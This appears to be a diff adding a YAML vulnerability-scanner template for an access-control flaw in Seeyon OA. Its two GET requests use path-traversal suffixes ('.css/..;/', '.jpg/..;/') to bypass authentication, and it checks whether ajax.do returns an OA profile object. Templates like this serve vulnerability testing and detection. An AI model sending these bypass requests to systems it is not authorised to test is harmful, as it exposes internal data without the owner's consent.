@@ -1,0 +1,22 @@
+name: yaml-poc-seeyon-seeyon_oa-idor-CT-158762
+binding: 181c39d1-f89c-41a0-96cb-cf54b0cac77b
+detail:
+    author: system_user
+    vulnerability:
+        id: 5bc67de3-20fc-413f-be8b-696fa629f3ba
+        level: high
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /seeyon/thirdpartyController.do.css/..;/ajax.do
+        expression: response.status == 200 && response.body.bcontains(bytes("java.lang.NullPointerException:null"))
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile
+        expression: response.status == 200 && response.body.bcontains(bytes("MMOneProfile")) && response.body.bcontains(bytes("productTags")) && response.body.bcontains(bytes("serverIdentifier")) && response.content_type.contains("application/json")
+expression: r0() && r1()
